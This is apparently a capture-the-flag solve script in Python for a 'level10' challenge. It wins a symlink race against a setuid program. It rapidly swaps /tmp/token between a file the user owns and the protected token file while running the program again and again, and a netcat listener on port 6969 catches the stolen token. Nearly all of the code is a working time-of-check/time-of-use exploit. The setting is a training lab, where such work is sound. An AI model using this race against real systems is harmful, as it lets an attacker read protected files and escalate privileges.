import threading
import subprocess
import os

flag = ""

def find_ip():
	"""
	Finds the local IP address that matches the first three octets of the IP address
	specified in the environment variable "IP".
	The function executes a shell command to get the list of local IP addresses, 
	processes the output to remove leading whitespaces, and extracts the second 
	field of each line. It then compares the first three octets of each local IP 
	address with the corresponding octets of the IP address from the environment 
	variable "IP". If a match is found, the matching IP address is returned.
	Returns:
		str: The local IP address that matches the first three octets of the IP 
			 address from the environment variable "IP", or None if no match is found.
	"""
	# sed -e: specifies the script to run
	#	's/^[ \t]*//': removes leading whitespaces:
	#		s/: substitute
	# 		^: beginning of the line
	#		[ \t]*: any number of whitespaces
	#		//: replace with nothing
	# cut -d ' ' -f 2: cuts the second field of the output
	#	-d ' ': delimiter is a space
	#	-f 2: second field
	command = "ifconfig | grep inet | sed -e 's/^[ \t]*//' | cut -d ' ' -f 2"
	output = subprocess.run(command, shell=True, capture_output=True)
	local_ips = output.stdout.decode().split("\n")
	parsed_ip = os.getenv("IP").split(".")
	for ip in local_ips:
		for i, n in enumerate(ip.split(".")):
			if n != parsed_ip[i]:
				break
			if i == 2 and n == parsed_ip[i]:
				return ip
	return None

def start_server(stop_event):
	global flag
	server = subprocess.Popen(["nc", "-l", "-k", "6969"], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
	while not stop_event.is_set():
		output = server.stdout.readline().decode()
		if output:
			if not (".*( )*." in output or "hello" in output):
				flag = output
				stop_event.set()
				break
	server.kill()
	server.wait() # Need this line to avoid zombie processes

def switch_symlink(connection, stop_event):
	connection.exec(f"echo 'hello' > /tmp/mine")
	for i in range(100):
		connection.exec(f"ln -sf /tmp/mine /tmp/token && echo 'mine'")
		connection.exec(f"ln -sf /home/user/level10/token /tmp/token && echo 'token'")
		if stop_event.is_set():
			break

def program_launch(connection, valid_ip, stop_event):
	for i in range(100):
		connection.exec(f"/home/user/level10/level10 /tmp/token {valid_ip}")	
		if stop_event.is_set():
			break

def solve(connection):
	valid_ip = find_ip()
	if not valid_ip:
		raise ValueError("No valid IP found")
	try:
		stop_event = threading.Event()
		server_thread = threading.Thread(target=start_server, args=(stop_event,))
		symlink_thread = threading.Thread(target=switch_symlink, args=(connection,stop_event,))
		program_thread = threading.Thread(target=program_launch, args=(connection,valid_ip,stop_event,))
		threads = [server_thread, symlink_thread, program_thread]
		for thread in threads:
			thread.start()
		while not stop_event.is_set():
			for thread in threads:
				thread.join(timeout=0.1)
	except KeyboardInterrupt:
		print("\nReceived interrupt, shutting down...")
	except Exception as e:
		print(f"An error occurred: {e}")
	finally:
		stop_event.set()
		for thread in threads:
			if thread.is_alive():
				thread.join(timeout=2)
		connection.exec("rm -f /tmp/mine /tmp/token")  # Cleanup files
		return "", flag

